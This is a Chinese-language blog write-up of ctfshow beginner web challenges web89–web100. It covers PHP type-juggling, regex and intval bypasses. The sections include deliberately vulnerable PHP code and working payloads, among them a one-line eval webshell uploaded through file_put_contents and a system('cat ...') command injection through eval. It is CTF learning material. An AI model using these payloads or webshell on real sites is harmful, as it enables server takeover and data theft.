<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="php特性, RE,Misc,Web,Cpypto等">
    <meta name="description" content="前言  此文章是用来刷ctfshow中web入门题的php特性部分
web89&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);

if(isset($_GET">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>php特性 | Know5</title>
    <link rel="icon" type="image/jpeg" href="/medias/th.jpg">
    
    <style>
        body{
            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
            background-repeat:no-repeat;
            background-size: 100% 100%;
            background-attachment:fixed;
        }
    </style>



    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/th.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Know5</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/th.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">Know5</div>
        <div class="logo-desc">
            
            注重于代码学习，网安学习，分享经验，分享知识。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">php特性</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/php%E5%AD%A6%E4%B9%A0/">
                                <span class="chip bg-color">php学习</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-02-06
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-03-06
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    17.9k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  此文章是用来刷ctfshow中web入门题的php特性部分</p>
<h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);

if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if(preg_match(&quot;&#x2F;[0-9]&#x2F;&quot;, $num))&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(intval($num))&#123;
    echo $flag;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题考点在于php中<strong>数组绕过正则表达式</strong>、首先在第一个if判断中，不能使传入的$num含有数字，如果有就会触发die函数，preg_match第二个参数要求是字符串，如果传入数组则不会进入if语句</p>
<p>所以我们可以通过构造数组来进行绕过，即<strong>url+&#x2F;?num[]&#x3D;1</strong></p>
<p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041822576.png"></p>
<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
    echo $flag;
  &#125;else&#123;
    echo intval($num,0);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此题在第一个判断需要$num等于数字4476,然后第二个判断中，只有当$num强等于4476才会给出flag的值</p>
<blockquote>
<p><strong>intval()</strong> 函数用于获取变量的整数值。</p>
<p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
<p><strong>int intval ( mixed $var [, int $base &#x3D; 10 ] )</strong></p>
<p>参数说明：</p>
<ul>
<li>$var：要转换成 integer 的数量值。</li>
<li>$base：转化所使用的进制。</li>
</ul>
<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p>
<ul>
<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
<li>将使用 10 进制 (decimal)。</li>
</ul>
</blockquote>
<p>根据此我们可以构造<strong>url+&#x2F;?num&#x3D;4476a</strong> </p>
<pre class="line-numbers language-none"><code class="language-none">num&#x3D;+4476   正号
num&#x3D;0x117c  十六进制
num&#x3D;010574  八进制
num&#x3D;0b1000101111100  二进制
num&#x3D;4476e1  
num&#x3D;4476.0  小数点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041829247.png"></p>
<h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
show_source(__FILE__);
include(&#39;flag.php&#39;);
$a&#x3D;$_GET[&#39;cmd&#39;];
if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;
  if(preg_match(&#39;&#x2F;^php$&#x2F;i&#39;, $a))&#123;
    echo &#39;hacker&#39;;
  &#125;
  else&#123;
    echo $flag;
  &#125;
&#125;
else&#123;
  echo &#39;nonononono&#39;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本题所想考的是<strong>正则表达式修饰符</strong>，</p>
<p>正则表达式的模式修正符</p>
<blockquote>
<p><strong>i</strong> 不区分大小写；<br>例如: &#x2F;abc&#x2F;i 可以匹配 abc、aBC、Abc </p>
<p><strong>g</strong> 全局匹配<br>如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回<br>如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置</p>
<p><strong>m</strong> 多行匹配<br>若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配,<br>因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行，<br>g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始<br>var str &#x3D; “abcggab\nabcoab”;<br>var preg1 &#x3D; &#x2F;^abc&#x2F;gm;  str.match(preg1)  &#x2F;&#x2F; 结果为：[“abc”, “abc”]<br>var preg2 &#x3D; &#x2F;ab$&#x2F;gm;   str.match(preg2)  &#x2F;&#x2F; 结果为：[“ab”, “ab”]</p>
<p><strong>s</strong> 特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是 匹配除换行符 \n 之外的任何单字符，加上s之后, . 中包含换行符</p>
<p><strong>U</strong> 只匹配最近的一个字符串;不重复匹配;<br>$mode&#x3D;”&#x2F;a(.<em>?)c&#x2F;“;<br>$preg&#x3D;”&#x2F;a.<em>c&#x2F;U”;&#x2F;&#x2F;这两个正则返回相同的值<br>$str&#x3D;”abcabbbcabbbbbc” ;<br>preg_match($mode,$str,$content);   echo $content[0];&#x2F;&#x2F;abc<br>preg_match($preg,$str,$content);   echo $content[0];&#x2F;&#x2F;abc<br>&#x2F;**&#x2F;修正符:x</em></em> 将模式中的空白忽略;<br>&#x2F;&#x2F;<strong>修正符:A</strong> 强制从目标字符串开头匹配;<br>&#x2F;&#x2F;<strong>修正符:D</strong> 如果使用$限制结尾字符,则不允许结尾有换行;<br>&#x2F;&#x2F;<strong>修正符:e</strong> 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </p>
</blockquote>
<p>通过<strong>url+&#x2F;?cmd&#x3D;%0aphp</strong>以此绕过，%0a代表换行，所以在第一个if中由于有着m所以匹配%0a换行后绕过，第二个if不符合正则表达式中以php开头，所以也满足绕过条件。所以得到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401041850255.png"></p>
<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if($num&#x3D;&#x3D;4476)&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(intval($num,0)&#x3D;&#x3D;4476)&#123;
    echo $flag;
  &#125;else&#123;
    echo intval($num,0);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这题和php90很像，与其不同的在于<strong>第二个if判断</strong>和<strong>第三个if判断</strong>的强等于变成了弱等于，这里例如<strong>4476a、4476.0以及+4476</strong>就已经无法绕过了，必须要对$num取进制值才能使得绕过</p>
<pre class="line-numbers language-none"><code class="language-none">num&#x3D;0x117c  十六进制
num&#x3D;010574  八进制
num&#x3D;0b1000101111100  二进制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>从而得到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081116340.png"></p>
<h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if($num&#x3D;&#x3D;4476)&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(intval($num,0)&#x3D;&#x3D;4476)&#123;
    echo $flag;
  &#125;else&#123;
    echo intval($num,0);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还是同样的味道不过这次相较于php92多加了一个preg_match过滤,可以发现的是过滤只将英文字母给过滤掉了，那么回忆下php92，八进制是转4476是纯数字，那么本题的答案就很明显了，让num为八进制的值就可以了。</p>
<pre class="line-numbers language-none"><code class="language-none">num&#x3D;010574  八进制<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081122606.png"></p>
<h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if($num&#x3D;&#x3D;&#x3D;&quot;4476&quot;)&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(preg_match(&quot;&#x2F;[a-z]&#x2F;i&quot;, $num))&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(!strpos($num, &quot;0&quot;))&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
    echo $flag;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时第二个if判断和第四个判断又变回了强等于，其中preg_match仍然过滤了英文字母，不同的是多了一个strpos函数，过滤了开头为0的数字，但是强等于的回归，说明我们在php90中的一些值也可以使用了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">拓展
strpos() 函数查找字符串在另一字符串中第一次出现的位置。
注释：strpos() 函数对大小写敏感。
strpos(string,find,start)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>string</em></td>
<td align="left">必需。规定要搜索的字符串。</td>
</tr>
<tr>
<td align="left"><em>find</em></td>
<td align="left">必需。规定要查找的字符串。</td>
</tr>
<tr>
<td align="left"><em>start</em></td>
<td align="left">可选。规定在何处开始搜索。</td>
</tr>
</tbody></table>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081142961.png"></p>
<p>可看出如果开头为0就会导致触发die函数且preg_match过滤了字母，所以二进制和十六进制仍然不用考虑。</p>
<p>最终结果为</p>
<pre class="line-numbers language-none"><code class="language-none">num&#x3D; 010574  八进制(在本题中，前面是有一个空格的)
num&#x3D;4476.0  小数点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081134364.png"></p>
<h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;num&#39;]))&#123;
  $num &#x3D; $_GET[&#39;num&#39;];
  if($num&#x3D;&#x3D;4476)&#123;
    die(&quot;no no no!&quot;);
  &#125;
  if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;
    die(&quot;no no no!!&quot;);
  &#125;
  if(!strpos($num, &quot;0&quot;))&#123;
    die(&quot;no no no!!!&quot;);
  &#125;
  if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;
    echo $flag;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先对本次preg_match进行fuzz测试下</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081202318.png"></p>
<p>然后可以本题变化在于第二个if判断又从强等于变回了弱等于，那么php94中的4476.0现在是没法使用了，我们需要考虑的是对八进制的这个值进行改进，最终结果有</p>
<pre class="line-numbers language-none"><code class="language-none">num&#x3D;%20010574  八进制（%20就是空格）
num&#x3D;+010574<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081203738.png"></p>
<h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);

if(isset($_GET[&#39;u&#39;]))&#123;
  if($_GET[&#39;u&#39;]&#x3D;&#x3D;&#39;flag.php&#39;)&#123;
    die(&quot;no no no&quot;);
  &#125;else&#123;
    highlight_file($_GET[&#39;u&#39;]);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这题所要考的是路径问题，highlight_file中均等效于flag.php，我们可以通过三种方法来解决</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php              绝对路径 
.&#x2F;flag.php                          相对路径 
php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php      php伪协议<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401081211292.png"></p>
<h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);
if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;
if ($_POST[&#39;a&#39;] !&#x3D; $_POST[&#39;b&#39;])
if (md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;]))
echo $flag;
else
print &#39;Wrong.&#39;;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这题首先是一个POST传参，然后是md5强等于，可以直接使用数组进行绕过，即post传参<strong>a[]&#x3D;1&amp;b[]&#x3D;2</strong></p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701617.png"></p>
<h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;
$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;
$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;
highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">三目运算符
格式
(expr1) ? (expr2) : (expr3);
类比于if、else
if(expr1)&#123;
expr2;
&#125;else&#123;
expr3;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我们可以将该代码修改为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
if(isset($_GET))&#123;
	$_GET&#x3D;&amp;$_POST;
&#125;else&#123;
	&#39;flag&#39;;
&#125;
if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;
$_GET&#x3D;&amp;$_COOKIE;
&#125;else&#123;
&#39;flag&#39;;
&#125;
if($_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;
$_GET&#x3D;&amp;$_SERVER;
&#125;else&#123;
&#39;flag&#39;;
&#125;
if($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;)&#123;
	$flag;
&#125;else&#123;
	__FILE__;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以只需要我们get和post同时传参HTTP_FLAG&#x3D;flag即可得到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701647.png"></p>
<h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
$allow &#x3D; array();
for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123; 
  array_push($allow, rand(1,$i));
&#125;
if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;
  file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先将$allow设置为数组，然后向数组内插入随机数，in_array()函数没有设置第三个参数 就可以形成自动转换eg:n&#x3D;1.php自动转换为1，所以我们可以get设置为一个php文件，然后content中传入一句话木马，那么就会在file_put_contents函数中，将content的所传的参写入n这个文件中</p>
<p>故可以构造该url</p>
<blockquote>
<p>get:  url+&#x2F;?1.php</p>
<p>post: content&#x3D;&lt;?php @eval($_POST[‘shell’]); ?</p>
</blockquote>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701431.png"></p>
<p>通过蚁剑进行连接，得到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701506.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">拓展：有三个不认识的函数，array_push()、in_array()、file_put_contents()
array_push() 函数向数组尾部插入一个或多个元素。
array_push(array,value1,value2...)
参数	描述
array	必需。规定一个数组。
value1	必需。规定要添加的值。
value2	可选。规定要添加的值。

in_array() 函数搜索数组中是否存在指定的值。
bool in_array ( mixed $needle , array $haystack [, bool $strict &#x3D; FALSE ] )
参数	描述
needle	必需。规定要在数组搜索的值。
haystack	必需。规定要搜索的数组。
strict	可选。如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。

file_put_contents() 函数把一个字符串写入文件中。
int file_put_contents (string $filename , mixed $data [, int $flags &#x3D; 0[, resource $context ]])
参数	描述
filename	必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。
data	必需。规定要写入文件的数据。可以是字符串、数组或数据流。
flags	可选。规定如何打开&#x2F;写入文件。可能的值：
FILE_USE_INCLUDE_PATH
FILE_APPEND
LOCK_EX
context	可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
include(&quot;ctfshow.php&quot;);
&#x2F;&#x2F;flag in class ctfshow;
$ctfshow &#x3D; new ctfshow();
$v1&#x3D;$_GET[&#39;v1&#39;];
$v2&#x3D;$_GET[&#39;v2&#39;];
$v3&#x3D;$_GET[&#39;v3&#39;];
$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&#123;
  if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;
    if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;
      eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);
    &#125;
  &#125;
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值。</p>
<pre class="line-numbers language-none"><code class="language-none">例如
$p &#x3D; 6 or 0;
var_dump($p);&#x2F;&#x2F;int(6)
$p &#x3D; 6 || 0;
var_dump($p);&#x2F;&#x2F;bool(true)
$p &#x3D; 6 and 0;
var_dump($p); &#x2F;&#x2F;int(6) 
$p &#x3D; 6 &amp;&amp; 0;
var_dump($p); &#x2F;&#x2F;bool(false) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我们可以通过给v1赋值从而来控制v0的值，剩下的就可以通过对v2，v3赋值以此来拿到ctfshow.php里的flag</p>
<p>可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;?v1&#x3D;1&amp;v2&#x3D;system(&quot;cat ctfshow.php&quot;)&#x2F;*&amp;v3&#x3D;\*&#x2F;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401191701844.png"></p>
<p>打开网页源代码可以找到flag</p>
